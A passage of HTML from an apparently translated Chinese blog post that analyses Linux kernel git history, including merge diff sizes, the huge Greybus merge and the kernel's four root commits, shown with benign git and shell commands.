class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">merges</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcc7428751038-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sort</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">merges</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'b2000b'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcc7428751038-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">2000</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3d6ce33</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcc7428751038-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">2000</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7fedd7e</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcc7428751038-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">2000</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f33f6f0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>（这个命令需要花费很长的时间运行: 我想大约需要12小时，尽管我已经减少了许多。）</p>\n<p>我认为合并的差异大小遵循单侧分布，就像父节点数量的统计一样。所以它应该在双对数坐标图表中显示为一条直线。让我检查一下….对了:</p>\n<p><img src=\"https://www.destroyallsoftware.com/images/blog/merges-per-diff-length-log-log.svg\" alt=\"\"></p>\n<p>我把差异的大小定在1000行左右(注：前面用2000行，得到的数据太少)，否则没有足够的样本来生成有效的曲线。</p>\n<p>右下角难看的原因部分是因为量化问题，另一部分是由于缺乏大量的提交导致样本数量较小，与之前的图表情况一样。</p>\n<p>现在，显而易见的问题是: 提交历史中差异最大的合并是哪个？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdccb472937312\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sort -n merges.txt | tail -1\r\n 22445760 f44dd18</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdccb472937312-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdccb472937312-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdccb472937312-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sort</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">merges</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tail</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdccb472937312-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22445760</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f44dd18</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>22,445,760 行差异！这看起来根本不可能这么大-因为差异的行数比整个内核源代码的行数都大。</p>\n<p>Greg Kroah-Hartman 在2016年9月19做了这一提交，当时正处在 4.8-rc6 版本的开发期间。Greg 是 Linus Torvalds 的 “副官” 之一 – 他（Linus）最亲近，最值得信赖的开发者。简单地说，副官们构成了内核 pull request 树中的第一层。Greg 负责维护内核的稳定分支，驱动程序内核，USB 子系统和其他几个子系统。</p>\n<p>在更加仔细的研究这个合并之前，我们需要一点背景知识。通常我们把合并作为菱形分支模式（先分支，然后合并，见下图）的一部分:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdccf203189336\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n  A\r\n / \r\nB   C\r\n  /\r\n  D</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdccf203189336-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdccf203189336-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdccf203189336-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdccf203189336-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdccf203189336-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdccf203189336-1\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">A</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdccf203189336-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdccf203189336-3\"><span class=\"crayon-i\">B</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">C</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdccf203189336-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdccf203189336-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">D</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在2014年，Greg 开始在一个新的仓库开发 Greybus (<a href=\"https://lwn.net/Articles/648400/\">移动设备总线</a>)，这就好像是他创建了一个全新的项目一样。最后，Greybus 的开发工作完成时，它就被合并到了内核中。但因为它是从一个崭新的仓库开始的，所以它和内核的中的其他源代码没有共同的历史记录。所以除了2005年我们公认的初始提交之外，这个合并为内核又添加了一个 “初始提交”。这个仓库现在有两条独立的初始提交，而不是通常的菱形分支模式：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcd2989195181\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n  A\r\n / \r\nB   C</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd2989195181-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcd2989195181-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd2989195181-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd2989195181-1\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">A</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcd2989195181-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd2989195181-3\"><span class=\"crayon-i\">B</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">C</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>通过查看合并提交的两个父节点中分别存在多少文件，我们可以看到一些蛛丝马迹:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcd6327600698\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git log -1 f44dd18 | grep 'Merge:'\r\nMerge: 9395452 7398a66\r\n$ git ls-tree -r 9395452 | wc -l\r\n   55499\r\n$ git ls-tree -r 7398a66 | wc -l\r\n     148</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd6327600698-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcd6327600698-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd6327600698-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcd6327600698-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd6327600698-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcd6327600698-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd6327600698-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f44dd18</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'Merge:'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcd6327600698-2\"><span class=\"crayon-v\">Merge</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9395452</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7398a66</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd6327600698-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">ls</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9395452</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcd6327600698-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">55499</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd6327600698-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">ls</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7398a66</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcd6327600698-6\"><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">148</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>一条分支存在大量的文件，因为它包含了整个内核的源文件。而另一条仅仅包含了很少的文件，因为它包含的只是 Greybus 的历史记录。</p>\n<p>像章鱼式合并一样，这会让一些 git 用户感到奇怪。但是内核开发人员是专家级的 git 用户，并倾向于放弃使用这个功能，但绝对不是盲目的放弃</p>\n<p>最后一个问题:这种情况到底发生了多少次？内核中有多少独立的 “初始化” 提交？事实上是四次:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcd9038397509\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git log --max-parents=0 --pretty=\"format:%h %cd %s\" --date=short\r\na101ad9 2016-02-23 Share upstreaming patches\r\ncd26f1b 2014-08-11 greybus: Initial commit\r\nbe0e5c0 2007-01-26 Btrfs: Initial checkin, basic working tree code\r\n1da177e 2005-04-16 Linux-2.6.12-rc2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd9038397509-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcd9038397509-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd9038397509-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcd9038397509-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcd9038397509-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd9038397509-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parents</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">pretty</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"format:%h %cd %s\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">date</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">short</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcd9038397509-2\"><span class=\"crayon-i\">a101ad9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2016</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">02</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">23</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Share </span><span class=\"crayon-e\">upstreaming </span><span class=\"crayon-e\">patches</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd9038397509-3\"><span class=\"crayon-i\">cd26f1b</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2014</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">greybus</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Initial </span><span class=\"crayon-e\">commit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcd9038397509-4\"><span class=\"crayon-i\">be0e5c0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2007</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">01</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Btrfs</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Initial </span><span class=\"crayon-v\">checkin</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">basic </span><span class=\"crayon-e\">working </span><span class=\"crayon-e\">tree </span><span class=\"crayon-i\">code</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcd9038397509-5\"><span class=\"crayon-cn\">1da177e</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2005</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">04</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Linux</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2.6.12</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rc2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0236 seconds] -->\r\n<p>如果我们要画出这些提交，为了清楚起见，我们忽略所有其他的历史记录，如下图:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcdd485294598\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n566cf87 (the current HEAD)\r\n| | | |\r\n| | | *- a101ad9 Share upstreaming patches\r\n| | |\r\n| | *- cd26f1b greybus: Initial commit\r\n| |\r\n| *- be0e5c0 Btrfs: Initial checkin, basic working tree code\r\n|\r\n*- 1da177e Linux-2.6.12-rc2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcdd485294598-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcdd485294598-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcdd485294598-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcdd485294598-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcdd485294598-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcdd485294598-6\">6</div><div class=\"crayon-num\" 